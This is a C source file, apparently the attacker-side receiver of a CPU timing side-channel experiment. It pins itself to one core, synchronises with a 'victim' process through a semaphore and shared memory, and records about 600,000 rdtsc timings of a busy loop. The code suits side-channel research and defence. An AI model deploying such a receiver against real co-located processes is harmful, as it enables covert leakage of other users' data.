#define _GNU_SOURCE
#include <sched.h>
#include <sys/times.h>
#include "cacheutils.h"

#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stddef.h>
#include <errno.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/socket.h>

#define SEM_KEY     100
#define SHM_KEY     101

typedef struct shared_use {
    int pktlen;
    unsigned char pkt[1528];
} shared_use_t;

union semun
{
int val;
struct semid_ds *buf;
unsigned short *array;
}sem_union;


static int sem_id = 0;
static void *shm = NULL;

// Release semaphore
static int semaphore_v(void)
{
    struct sembuf sem_b;

    sem_b.sem_num = 0;
    sem_b.sem_op = 1;
    sem_b.sem_flg = SEM_UNDO;
    if (semop(sem_id, &sem_b, 1) == -1) {
        return -1;
    }

    return 0;
}

// Lock semaphore
static int semaphore_p(void)
{
    struct sembuf sem_b;

    sem_b.sem_num = 0;
    sem_b.sem_op = -1;
    sem_b.sem_flg = SEM_UNDO;
    if (semop(sem_id, &sem_b, 1) == -1) {
        return -1;
    }

    return 0;
}

// Initialize semaphore
static int semaphore_init(void)
{
    union semun sem_union;

    sem_id = semget((key_t)SEM_KEY, 1, 0666 | IPC_CREAT);
    if (sem_id == -1) {
        return -1;
    }
    sem_union.val = 0;
    if (semctl(sem_id, 0, SETVAL, sem_union) == -1) {
        return -1;
    }


    return 0;
}

// Initialize Shared Memory
static int sharemmy_init(void)
{
    int shmid;

    shmid = shmget((key_t)SHM_KEY, sizeof(shared_use_t), 0666 | IPC_CREAT);
    if (shmid == -1) {
        return shmid;
    }

    shm = shmat(shmid, (void *)0, 0);
    if (shm == (void *)-1) {
        return -1;
    }

    return shmid;
}

// Delete shared memory
static int sharemmy_destroy(int shmid, void *shm)
{
    int rv;

    rv = shmdt(shm);
    if (rv == -1) {
        return rv;
    }

    rv = shmctl(shmid, IPC_RMID, 0);
    if (rv == -1) {
        return rv;
    }

    return 0;
}
void set_cpu(int id);
int i=0,j=0;
int m=5;

int main()
{
    int rv;
    int shmid;
    register u_int64_t time1, time2;
    // CPU binding
    set_cpu(8);
    u_int64_t t[600150];

    // Initialize semaphore
    rv = semaphore_init();
    if (rv < 0) {
        printf("Init a semaphore fail.\n");
        return 0;
    }
    
    // Initialize Shared Memory
    shmid = sharemmy_init();
    if (shmid == -1) {
        printf("Init a share memory fail.\n");
        return 0;
    }
    
    // Synchronization with victim
    semaphore_p();
    memcpy(t, ((shared_use_t *)shm)->pkt, ((shared_use_t *)shm)->pktlen);

    for (i = 10; i < 40010; i++) {
    	// Precise synchronization using timestamp
	t[0] = t[0] + 25000;
        time1 = rdtsc();
        while (time1 < t[0]) time1 = rdtsc();
	// Constantly sample the execution time of the nop-receiver
	for (int z = 0; z < 15; z++) {
		time2 = rdtsc();
		// nop-receiver, change in attacker.s
		for(j=0;j<100;j++)
    		{
			m=m+23323;
    		}
		t[i * 15 + z] = rdtsc() - time2;
	}
    }
    // // Sample time output
    for (i = 150; i < 600150; i++) {
	printf("%ld\n", t[i]);
    }
	
    // Delete shared memory
    rv = sharemmy_destroy(shmid, shm);
    if (rv < 0) {
        printf("Destroy share memory fail.\n");
        return 0;
    }
    return 1;
}

// setup the cpu set of this program to run on
void set_cpu(int id)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(id, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) == -1)
    {
        fprintf(stderr, "warning: could not set CPU affinity/n");
    }
}
